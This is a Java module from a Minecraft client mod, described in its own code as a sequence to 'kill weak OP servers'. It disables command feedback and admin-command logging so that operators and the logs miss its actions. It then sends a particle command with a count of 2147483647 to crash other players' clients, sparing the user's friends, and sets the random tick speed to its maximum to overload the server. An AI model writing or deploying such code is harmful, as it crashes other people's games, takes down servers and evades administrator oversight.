package dev.mlml.korppu.module.modules;

import dev.mlml.korppu.KorppuMod;
import dev.mlml.korppu.config.BooleanSetting;
import dev.mlml.korppu.config.DoubleSetting;
import dev.mlml.korppu.module.Module;
import dev.mlml.korppu.module.StatusEntry;
import dev.mlml.korppu.player.PlayerManager;
import net.minecraft.client.multiplayer.PlayerInfo;
import org.lwjgl.glfw.GLFW;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class OPServerKillModule extends Module {
    private final BooleanSetting autoCompat = config.add(new BooleanSetting("AutoCompat", "Use snake_case gamerules on 1.21.11+", true));
    private final BooleanSetting sendCommandFeedback = config.add(new BooleanSetting("Disable sendCommandFeedback", "Hide commands from other operators", true));
    private final BooleanSetting logAdminCommands = config.add(new BooleanSetting("Disable logAdminCommands", "Hide commands from server logs", true));
    private final BooleanSetting crashOtherPlayers = config.add(new BooleanSetting("Crash Other Players", "Send particle payload before final kill command", true));
    private final BooleanSetting nocrashfrend = config.add(new BooleanSetting("Dont Crash Friends", "Exclude tracked friends from particle crash", true));
    private final DoubleSetting tickDelay = config.add(new DoubleSetting("Tick Delay", "Delay between sequence steps", 1d, 0d, 20d, 0));
    private final DoubleSetting killValue = config.add(new DoubleSetting("Kill Value", "Value for random tick speed", 2147483647d, 0d, 2147483647d, 0));

    private final List<Runnable> steps = new ArrayList<>();
    private int delayCounter;
    private int stepIndex;
    private String serverVersion;

    public OPServerKillModule() {
        super("OPServerKillModule", "Runs Trouser-Streak command sequence to kill weak OP servers", GLFW.GLFW_KEY_UNKNOWN);
    }

    @Override
    public void onEnable() {
        if (KorppuMod.mc.player == null || KorppuMod.mc.getConnection() == null) {
            setEnabled(false);
            return;
        }

        delayCounter = 0;
        stepIndex = 0;
        serverVersion = detectServerVersion();
        steps.clear();

        if (sendCommandFeedback.getValue()) steps.add(this::sendCommandFeedback);
        if (logAdminCommands.getValue()) steps.add(this::logAdminCommands);
        if (crashOtherPlayers.getValue()) steps.add(this::crashOtherPlayers);
        steps.add(this::randomTickSpeed);
    }

    @Override
    public void onTick() {
        if (KorppuMod.mc.player == null || KorppuMod.mc.getConnection() == null) {
            setEnabled(false);
            return;
        }

        if (stepIndex >= steps.size()) {
            setEnabled(false);
            return;
        }

        int wait = Math.max(0, tickDelay.getValue().intValue());
        if (delayCounter < wait) {
            delayCounter++;
            return;
        }

        delayCounter = 0;
        steps.get(stepIndex).run();
        stepIndex++;
    }

    private void sendCommandFeedback() {
        sendCommand("gamerule " + gameruleName("sendCommandFeedback", "send_command_feedback") + " false");
    }

    private void logAdminCommands() {
        sendCommand("gamerule " + gameruleName("logAdminCommands", "log_admin_commands") + " false");
    }

    private void randomTickSpeed() {
        sendCommand("gamerule " + gameruleName("randomTickSpeed", "random_tick_speed") + " " + killValue.getValue().intValue());
    }

    private void crashOtherPlayers() {
        if (KorppuMod.mc.player == null || KorppuMod.mc.getConnection() == null) return;

        String selector = "name=!" + KorppuMod.mc.player.getName().getString();
        if (nocrashfrend.getValue()) {
            List<String> tokens = new ArrayList<>();
            tokens.add(selector);
            for (PlayerInfo entry : KorppuMod.mc.getConnection().getListedOnlinePlayers()) {
                if (PlayerManager.getInstance().isFriend(entry.getProfile().id())) {
                    tokens.add("name=!" + entry.getProfile().name());
                }
            }
            selector = String.join(",", tokens);
        }

        sendCommand("execute at @a[" + selector + "] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[" + selector + "]");
    }

    private void sendCommand(String command) {
        if (KorppuMod.mc.player == null) return;
        KorppuMod.mc.player.connection.sendCommand(command.startsWith("/") ? command.substring(1) : command);
    }

    private String gameruleName(String oldName, String newName) {
        if (!autoCompat.getValue()) return newName;
        if (serverVersion == null) return newName;
        return isVersionLessThan(serverVersion, 1, 21, 11) ? oldName : newName;
    }

    private String detectServerVersion() {
        if (KorppuMod.mc.hasSingleplayerServer() && KorppuMod.mc.getSingleplayerServer() != null) {
            return KorppuMod.mc.getSingleplayerServer().getServerVersion();
        }
        if (KorppuMod.mc.getCurrentServer() != null && KorppuMod.mc.getCurrentServer().version != null) {
            return KorppuMod.mc.getCurrentServer().version.getString();
        }
        return null;
    }

    private boolean isVersionLessThan(String version, int major, int minor, int patch) {
        Matcher matcher = Pattern.compile("(\\d+)\\.(\\d+)\\.(\\d+)").matcher(version);
        if (!matcher.find()) return false;

        int foundMajor = Integer.parseInt(matcher.group(1));
        int foundMinor = Integer.parseInt(matcher.group(2));
        int foundPatch = Integer.parseInt(matcher.group(3));

        if (foundMajor != major) return foundMajor < major;
        if (foundMinor != minor) return foundMinor < minor;
        return foundPatch < patch;
    }

    @Override
    public List<StatusEntry> getStatusEntries() {
        return List.of(
                StatusEntry.text("Step", stepIndex + "/" + steps.size()),
                StatusEntry.text("Delay", String.valueOf(tickDelay.getValue().intValue())),
                StatusEntry.text("KillValue", String.valueOf(killValue.getValue().intValue()))
        );
    }
}
